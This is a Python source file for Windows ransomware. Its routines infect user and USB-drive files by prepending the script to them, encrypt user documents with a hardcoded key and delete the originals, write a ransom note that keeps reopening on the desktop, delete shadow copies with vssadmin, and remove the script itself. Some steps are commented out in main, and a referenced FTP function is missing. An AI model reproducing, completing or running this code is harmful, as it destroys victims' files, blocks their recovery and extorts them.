#!/usr/bin/python3.8
import ftplib
import getpass
import glob
import os
import subprocess
import time
from ftplib import FTP

import sys
import win32con
import win32gui
from cryptography.fernet import Fernet
import requests


status = 'INFECTED'


def virus_property():
    user = getpass.getuser()
    target = ('txt', '.pdf', '.png', '.exe')
    path = 'C:/Users/' + user + '/'
    for r, d, files in os.walk(path):
        for file in files:
            if file.endswith(target):
                try:
                    with open(file, 'rb+') as g:
                        line = g.read()
                        if status not in line:
                            g.seek(0, 0)
                            with open(sys.argv[0], 'rb+') as c:
                                lines = c.read()
                                g.write(lines + '\n' + line)
                                g.close()
                                c.close()
                                os.chmod(file, 777)
                        else:
                            pass
                except Exception:
                    pass
        break


def usb_infection():
    target = ('txt', '.pdf', '.png', '.exe')
    path = 'F:\\'
    for r, d, files in os.walk(path):
        for file in files:
            if file.endswith(target):
                try:
                    with open(file, 'rb+') as g:
                        line = g.read()
                        if status not in line:
                            g.seek(0, 0)
                            with open(sys.argv[0], 'rb+') as c:
                                lines = c.read()
                                g.write(lines + '\n' + line)
                                g.close()
                                c.close()
                                os.chmod(file, 777)
                        else:
                            pass
                except Exception:
                    pass
        break


f_name = []
targets = ('.txt', '.docx', '.doc', '.lnk',
           '.xlsx', '.pdf', '.zip', '.ppt',
           '.jpg', '.jpeg', 'gif', '.mp3',
           '.mp4', '.svg', '.ico', '.3gp',
           'ink', '.gz', '.rar', '.wav',
           '.iso', '.java', '.html', '.css',
           '.key', '.enc')


def find_file():
    usr = getpass.getuser()
    # Get files to encrypt from current user
    path = 'C:/Users/' + usr + '/'
    for r, d, files in os.walk(path):
        for file in files:
            if file.endswith(targets):
                f_name.append(os.path.join(r, file))
                print(f_name)
                break


def encrypt_file():
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
    for fn in f_name:
        k = key
        f = Fernet(k)
        try:
            with open(fn, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)
            with open(fn + '.crypy', "wb") as file:
                file.write(encrypted_data)
                print(file)
                os.remove(fn)
        except Exception:
            pass


def message():
    # this function prompts a window containing the ransom message
    import gui
    gui.gui()


def ransom_note():
    # Create ransome note .txt
    usr = getpass.getuser()
    path = 'C:/Users/' + usr + '/Desktop/'
    try:
        with open(path + "RANSOM NOTE.txt", "w+") as file:
            file.write("""
WE HAVE COMPROMISED YOUR COMPUTER AND ENCRYPTED YOUR FILES
PAY UP
""")
    except Exception as e:
        print(e)
        pass


def show_ransom_note():
    # Open the created ransom note in notepad.exe
    usr = getpass.getuser()
    path = 'C:/Users/' + usr + '/Desktop/'
    note = subprocess.Popen(['notepad.exe', path + 'RANSOM NOTE.txt'])
    count = 0

    while True:
        time.sleep(0.1)
        top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if top_window == 'RANSOM NOTE - Notepad':
            pass
        else:
            note.kill()
            note = subprocess.Popen(['notepad.exe', path + 'RANSOM NOTE.txt'])
        time.sleep(10)
        count += 1
        if count == 2:
            break


def dlt_shadow_copy():
    try:
        os.system('vssadmin.exe delete shadows/all /quiet')
    except Exception:
        pass


def delete_ransomware():
    os.remove(sys.argv[0])


def main():
    # Hides the terminal console to prevent suspicion while working in background
    # hide = win32gui.GetForegroundWindow()
    # win32gui.ShowWindow(hide, win32con.SW_HIDE)
    virus_property()
    usb_infection()
    # find_file()
    # encrypt_file()
    message()
    # ransom_note()
    # show_ransom_note()
    # ftp_work()
    # dlt_shadow_copy()
    # delete_ransomware()


if __name__ == "__main__":
    main()
